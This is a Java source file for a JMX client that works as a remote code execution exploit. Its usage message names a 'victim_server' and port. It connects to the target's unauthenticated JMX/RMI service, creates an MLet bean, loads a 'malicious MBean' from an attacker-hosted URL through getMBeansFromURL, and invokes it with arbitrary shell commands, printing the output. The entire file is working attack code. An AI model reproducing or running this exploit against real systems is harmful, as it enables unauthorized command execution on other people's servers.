package com.demo;

import javax.management.MBeanServerConnection;
import javax.management.ObjectInstance;
import javax.management.ObjectName;
import javax.management.remote.JMXConnector;
import javax.management.remote.JMXConnectorFactory;
import javax.management.remote.JMXServiceURL;
import java.util.HashSet;
import java.util.Iterator;

/**
 * Created by someone on someday.
 */
public class JMXClient {
    public static void main(String[] args) {

        if (args.length < 4) {
            System.out.println("usage: java -jar victim_server victim_port http://server_ip:server_port/mlet cmd");
            System.exit(-1);
        }

        String victimServer = args[0];
        String victimPort = args[1];
        String mLetUrl = args[2];
        StringBuilder cmds = new StringBuilder();
        for (int i = 3; i < args.length; i++) {
            cmds.append(args[i]);
            cmds.append(" ");
        }
        String cmd = cmds.toString();

        try {
            JMXServiceURL url = new JMXServiceURL("service:jmx:rmi:///jndi/rmi://" + victimServer + ":" + victimPort +  "/jmxrmi");

            System.out.println("[+] Connecting to JMX URL: "+url +" ...");

            JMXConnector connector = JMXConnectorFactory.connect(url);
            MBeanServerConnection mBeanServer = connector.getMBeanServerConnection();

            System.out.println("[+] Connected: " + connector.getConnectionId());

            ObjectInstance payloadBean = null;

            System.out.println("[+] Trying to create MLet bean...");
            ObjectInstance mLetBean = null;

            try {
                mLetBean = mBeanServer.createMBean("javax.management.loading.MLet", null);
            } catch (javax.management.InstanceAlreadyExistsException e) {
                mLetBean = mBeanServer.getObjectInstance(new ObjectName("DefaultDomain:type=MLet"));
            }

            System.out.println("[+] Loaded "+mLetBean.getClassName());
            System.out.println("[+] Loading malicious MBean from " + mLetUrl);
            System.out.println("[+] Invoking: "+mLetBean.getClassName() + ".getMBeansFromURL");
            Object res = mBeanServer.invoke(mLetBean.getObjectName(), "getMBeansFromURL",
                    new Object[] { mLetUrl },
                    new String[] { String.class.getName() }
            );

            HashSet res_set = ((HashSet)res);
            Iterator itr = res_set.iterator();
            Object nextObject = itr.next();

            if (nextObject instanceof Exception) {
                throw ((Exception)nextObject);
            }
            payloadBean  = ((ObjectInstance)nextObject);

            System.out.println("[+] Loaded class: "+ payloadBean.getClassName());
            System.out.println("[+] Loaded MBean Server ID: "+ payloadBean.getObjectName());
            System.out.println("[+] Invoking: "+ payloadBean.getClassName()+".run()");

            String s = (String) mBeanServer.invoke(payloadBean.getObjectName(), "run", new Object[]{cmd}, new String[]{ String.class.getName()});

            System.out.println("[+] Output:");
            System.out.println(s);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
